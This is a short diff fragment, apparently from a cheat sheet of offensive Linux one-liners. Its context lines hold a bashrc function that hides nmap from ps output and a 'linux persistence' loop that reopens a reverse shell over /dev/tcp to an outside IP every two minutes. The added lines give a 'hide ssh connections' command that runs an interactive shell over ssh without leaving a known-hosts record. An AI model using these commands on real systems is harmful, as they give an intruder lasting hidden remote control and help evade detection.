@@ -3,3 +3,6 @@ echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.ba
 
 linux persistence
 while :; do setsid bash -i &>/dev/tcp/1.1.1.1/8443 0>&1; sleep 120; done &>/dev/null &
+
+hide ssh connections
+ssh -o UserKnownHostsFile=/dev/null -T user@target.com 'bash -i'"
